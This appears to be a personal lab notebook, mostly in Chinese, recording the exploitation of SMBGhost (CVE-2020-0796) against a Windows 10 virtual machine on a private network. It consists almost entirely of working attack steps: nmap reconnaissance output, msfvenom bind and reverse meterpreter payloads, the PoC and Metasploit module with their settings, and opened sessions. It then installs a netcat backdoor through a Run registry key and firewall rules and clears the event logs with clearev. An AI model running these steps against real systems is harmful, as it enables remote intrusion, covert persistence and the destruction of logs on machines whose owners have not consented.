https://cn-sec.com/archives/981438.html

https://www.jianshu.com/p/cad64e889f53
文件名
cn_windows_10_business_editions_version_1903_x64_dvd_e001dd2c.iso
SHA1
bc6176bee6130446421aca236e7944ee88c92fe8
文件大小
4.48GB
发布时间
2019-04-19

sudo arp-scan -l
192.168.55.153

sudo nmap    -p 1-65535  -A -O 192.168.55.153
Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-18 08:57 UTC
Nmap scan report for DESKTOP-7833UIB.lan (192.168.55.153)
Host is up (0.0038s latency).
Not shown: 65524 closed tcp ports (reset)
PORT      STATE SERVICE       VERSION
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
5040/tcp  open  unknown
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  msrpc         Microsoft Windows RPC
MAC Address: 50:1A:C5:0C:46:9A (Microsoft)
Device type: general purpose
Running: Microsoft Windows 10
OS CPE: cpe:/o:microsoft:windows_10
OS details: Microsoft Windows 10 1709 - 1909
Network Distance: 1 hop
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   311: 
|_    Message signing enabled but not required
|_nbstat: NetBIOS name: DESKTOP-7833UIB, NetBIOS user: <unknown>, NetBIOS MAC: 000c29b89433 (VMware)
|_clock-skew: -8h00m07s
| smb2-time: 
|   date: 2023-02-18T01:00:57
|_  start_date: N/A


https://github.com/ly4k/SMBGhost/blob/master/scanner.py
python3 scanner.py 192.168.55.153

youfanghuoqian sheme ye buxianshi


msfvenom  -p windows/x64/meterpreter/bind_tcp  lport=1234 -f py -o evil.py

git clone https://github.com/chompie1337/SMBGhost_RCE_PoC.git


python3 exploit.py -ip 192.168.55.153

msfconsole
use exploit/multi/handler 
set payload windows/x64/meterpreter/bind_tcp 
set lport 1234
set rhost 192.168.55.153
run

chenggongbiaozhi    chenggonglvtaidi   di 21ci chenggong 
[*] Started bind TCP handler against 192.168.55.153:1234
[*] Sending stage (200774 bytes) to 192.168.55.153
[*] Meterpreter session 1 opened (192.168.55.201:39593 -> 192.168.55.153:1234


多试几次就成功   成功率很低 看bilibili成功率很高  我的成功率太低 python3 exploit.py -ip 192.168.55.153跟run的顺序可以换过来


开启远程桌面 https://www.cnblogs.com/jihejihe/articles/16899783.html

这个是反弹shell  https://blog.csdn.net/qq_51550750/article/details/125174065
msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.55.201 lport=1335 -b '\x00' -f python

use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set lhost 192.168.55.201
set lport 1335
试了10次成功了
试了7次成功了

这个留了个nc后门https://www.bilibili.com/video/BV1sg411N7EY/?vd_source=0b2a488b7e3ae1213bcd8e34b1af9692
upload /usr/share/windows-binaries/nc.exe c://windows/system32      如果开着windows defender会报HackTool
reg enumkey -k HKLM\\software\\microsoft\\windows\\currentversion\\run
reg setval -k HKLM\\software\\microsoft\\windows\\currentversion\\run -v nc -d 'c:\windows\system32\nc.exe -Ldp 444 -e cmd.exe'   
shell
netsh firewall add portopening TCP 444 "FireWall" ENABLE ALL
或者
netsh advfirewall firewall add rule name="test444" protocol=TCP dir=in localport=444 action=allow
exit
clearev
nc 192.168.55.153 444 就可以连接了


msfconsole search CVE-2020-0796试试
use exploit/windows/smb/cve_2020_0796_smbghost
set RHOSTS 192.168.55.153
set LHOST 192.168.55.201
set DefangedMode false
cd /usr/share/metasploit-framework/
sudo chmod +777 ./
创建/usr/share/metasploit-framework/external/source/exploits/CVE-2020-0796/RCE/kernel_shellcode.asm 文件
用这个创建https://github.com/rapid7/metasploit-framework/blob/master/external/source/exploits/CVE-2020-0796/RCE/kernel_shellcode.asm
不用SMBGhost_RCE_PoC 里面的kernel_shellcode.asm
run
重启了2次机后测试成功
貌似这个成功率高
开了windows defender 也能成功 内核隔离打不开 开了防火墙
开了防火墙就扫不出 445了
sudo nmap    -p 1-65535  -A -O 192.168.55.153
Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-19 14:55 UTC
Nmap scan report for DESKTOP-7833UIB.lan (192.168.55.153)
Host is up (0.0070s latency).
Not shown: 65533 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
3389/tcp open  ms-wbt-server Microsoft Terminal Service
7680/tcp open  pando-pub?
MAC Address: 50:1A:C5:0C:46:9A (Microsoft)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|specialized
Running (JUST GUESSING): Microsoft Windows XP (89%), AVtech embedded (87%), FreeBSD 6.X (85%)
OS CPE: cpe:/o:microsoft:windows_xp::sp2 cpe:/o:freebsd:freebsd:6.2
Aggressive OS guesses: Microsoft Windows XP SP2 (89%), AVtech Room Alert 26W environmental monitor (87%), Microsoft Windows XP SP3 (86%), FreeBSD 6.2-RELEASE (85%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 1 hop
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows





乱码解决chcp 65001   https://www.bilibili.com/video/BV11U4y137J5/?spm_id_from=333.788.recommend_more_video.-1&vd_source=0b2a488b7e3ae1213bcd8e34b1af9692




文件名
cn_windows_10_business_editions_version_1909_x64_dvd_0ca83907.iso
SHA1
a153526cdd406a249a93f30b447b259fed560c1d
文件大小
4.91GB
发布时间
2019-10-16


